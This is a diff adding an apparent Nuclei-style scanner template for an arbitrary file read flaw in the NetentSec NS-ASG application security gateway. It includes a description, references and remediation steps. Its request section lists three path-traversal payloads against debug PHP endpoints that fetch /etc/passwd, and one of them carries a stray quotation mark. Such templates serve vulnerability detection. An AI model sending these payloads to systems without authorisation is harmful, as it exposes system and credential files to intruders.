@@ -1,0 +1,47 @@
+id: wooyun-2014-058932
+info:
+  name: NetentSec NS-ASG Application Security Gateway File Read
+  author:
+  - 折跃
+  description: |-
+    NetentSec NS-ASG application security gateway file read
+    Beijing NetentSec Technology Co., Ltd. is a provider of network application management devices.
+
+    The NetentSec NS-ASG application security gateway has an arbitrary file read vulnerability. An attacker can exploit the vulnerability to obtain sensitive information.
+  reference:
+  - http://www.wooyun.org/bugs/wooyun-2014-058925
+  - http://www.wooyun.org/bugs/wooyun-2014-058932
+  - http://www.wooyun.org/bugs/wooyun-2014-058944
+  - http://www.wooyun.org/bugs/wooyun-2014-058987
+  severity: high
+  remediation: |
+    Official fix:
+    1. It is recommended that users obtain the latest patch or latest version from the official website:
+
+    Temporary fix:
+    1. Filter "." so that users cannot traverse to parent directories in the URL.
+    2. Strictly validate the format of user-supplied parameters using regular expressions; hard-code or uniformly encode the file name parameter passed by the user, control file types through a whitelist, and reject parameters containing malicious or empty characters.
+    3. Disable directory traversal services on the system; for example, set open_basedir in php.ini to restrict the file access scope.
+    4. Store file paths in the database and let users submit the file ID to download the file.
+    5. Verify permissions before allowing users to download files.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'root:')
+    - contains(body,'bash')
+  path:
+  - '{{BaseURL}}/{{varPath}}'
+  attack: batteringram
+  method: GET
+  payloads:
+    varPath:
+    - “debug/rproxy_diag.php?action=download&filename=/etc/passwd
+    - debug/rproxy_diag.php?action=tarfile&search=&logfile[0]=../../etc/passwd
+    - debug/show_logfile.php?filename=/etc/passwd
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+  stop-at-first-match: true
